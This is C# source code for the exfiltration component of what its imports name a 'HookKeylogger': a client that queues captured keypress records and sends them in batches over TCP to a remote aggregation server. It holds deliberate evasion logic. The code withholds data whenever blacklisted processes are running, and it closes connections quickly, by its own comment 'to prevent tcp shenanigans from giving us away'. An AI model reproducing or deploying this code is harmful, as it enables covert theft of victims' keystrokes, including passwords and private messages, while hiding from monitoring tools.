using Google.Protobuf;
using HookKeylogger.AggergationServer.Types;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Threading;

namespace KeypressAggregator
{
    /// <summary>
    /// TCP Extension class to report the state of the connection.
    /// </summary>
    public static class TCPExtension
    {
        /// <summary>
        /// Get the TcpState of the connection.
        /// http://goo.gl/NTEPqn
        /// </summary>
        /// <param name="tcpClient"></param>
        /// <returns></returns>
        public static TcpState GetState(this TcpClient tcpClient)
        {
            try
            {
                var foo = IPGlobalProperties.GetIPGlobalProperties()
              .GetActiveTcpConnections()
              .SingleOrDefault(x => x.LocalEndPoint.Equals(tcpClient.Client.LocalEndPoint));
                return foo != null ? foo.State : TcpState.Unknown;
            }
            catch
            {
                return TcpState.Unknown;
            }
            
        }
    }
    

    class ServerClient
    {
        private ConcurrentQueue<CI> inq ;
        private ConcurrentQueue<CI> buffer;
        private string addr;
        private int port;
        private int bufSize;
        private TcpClient client;

        private string[] blacklistProcess;

        public ServerClient(string addr, int port, string[] blacklist)
        {
            this.inq = new ConcurrentQueue<CI>();
            this.buffer = new ConcurrentQueue<CI>();
            this.addr = addr;
            this.port = port;
            this.bufSize = 10;
            this.client = new TcpClient(addr, port);
            this.blacklistProcess = blacklist;
        }

        /// <summary>
        /// Worker routine which reads from the input queue and sends the messages to the server.
        /// </summary>
        public void Start()
        {
            while (this.inq != null)
            {
                CI ci;
                while (inq.TryDequeue(out ci))
                {
                    buffer.Enqueue(ci);
                    
                    // If the buffer is full, write to the server.
                    if (buffer.Count >= bufSize)
                    {
                        this.send();
                    }
                }
                Thread.Sleep(1000);
            }
        }

        /// <summary>
        /// If the client is not connected try and connect again.
        /// </summary>
        private bool connect()
        {
            if (client == null)
            {
                client = new TcpClient(addr, port);
            }
            if (client.GetState() != TcpState.Established)
            {
                client.Connect(this.addr, this.port);
            }
            if (client.GetState() != TcpState.Established)
            {
                return false;
            }
            else
            {
                return true;
            }
        }

        /// <summary>
        /// Close the stream and client to prevent tcp shenanigans from giving us away.
        /// </summary>
        private void disconnect()
        {
            if (client != null)
            {
                client.GetStream().Close();
                client.Close();
                client = null;
            }
        }

        private bool safeToSend()
        {
            // Check each of the blacklisted processes, if the process is present don't send.
            foreach(string name in blacklistProcess)
            {
                if (Process.GetProcessesByName(name).Length != 0)
                {
                    return false;
                }
            }
            return true;
        }

        /// <summary>
        /// Send the buffer to the server but don't send the buffer to the server if a connection cannot
        /// be made and its not safe to send don't try to send any data.
        /// </summary>
        private void send()
        {
            if (!safeToSend())
            {
                return;
            }

            if (!connect())
            {
                return;
            }

            BufferedStream stream = new BufferedStream(client.GetStream());
            CI ci;
            while(buffer.TryDequeue(out ci))
            {
                try {
                    // Actually send the message over the wire.
                    ci.WriteDelimitedTo(stream);
                }
                catch (SocketException)
                {
                    // Assume the message was not received, place the message back in the send buffer.
                    buffer.Enqueue(ci);
                    break;
                }

            }
            stream.Flush();

            // Closet down the client to shutdown the tcp connection and avoid any extra packets.
            disconnect();
        }

        /// <summary>
        /// Handel Send 
        /// </summary>
        /// <param name="ci"></param>
        public void Send(CI ci)
        {
            this.inq.Enqueue(ci);
        }
    }
}
